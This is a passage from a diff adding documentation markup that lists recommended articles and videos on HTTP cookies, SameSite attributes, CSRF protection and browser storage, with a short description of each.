+    Understanding third-party cookies, privacy implications, and the transition to a cookieless future.
+  </Card>
+</CardGroup>
+
+---
+
+## Articles
+
+<CardGroup cols={2}>
+  <Card title="Cookies, document.cookie — javascript.info" icon="newspaper" href="https://javascript.info/cookie">
+    Clear, beginner-friendly JavaScript tutorial with practical helper functions. Includes interactive examples you can run in the browser.
+  </Card>
+  <Card title="SameSite Cookies Explained — web.dev" icon="newspaper" href="https://web.dev/articles/samesite-cookies-explained">
+    Chrome team's definitive guide to SameSite attribute and CSRF protection. Essential reading for understanding modern cookie security.
+  </Card>
+  <Card title="Cookies and Security — Nicholas Zakas" icon="newspaper" href="https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/">
+    Deep dive into cookie security from a web security expert. Covers attack vectors and defense strategies in detail.
+  </Card>
+  <Card title="HTTP Cookies Explained — freeCodeCamp" icon="newspaper" href="https://www.freecodecamp.org/news/everything-you-need-to-know-about-cookies-for-web-development/">
+    Comprehensive overview of cookies for web developers. Great starting point with practical examples and clear explanations.
+  </Card>
+</CardGroup>
+
+---
+
+## Videos
+
+<CardGroup cols={2}>
+  <Card title="What Is JWT and Why Should You Use JWT — Web Dev Simplified" icon="video" href="https://www.youtube.com/watch?v=7Q17ubqLfaM">
+    Kyle Cook explains JWT tokens and their relationship to cookie-based authentication. Great for understanding when to use cookies vs tokens for sessions.
+  </Card>
+  <Card title="Cookies vs localStorage vs sessionStorage — Fireship" icon="video" href="https://www.youtube.com/watch?v=GihQAC1I39Q">
+    Fast-paced comparison of browser storage options. Perfect for understanding when to use each storage mechanism.
+  </Card>
+  <Card title="HTTP Cookies Crash Course — Hussein Nasser" icon="video" href="https://www.youtube.com/watch?v=sovAIX4doOE">
+    Deep technical explanation of how cookies work at the HTTP level. Covers headers, attributes, and security in detail.
+  </Card>
+</CardGroup>
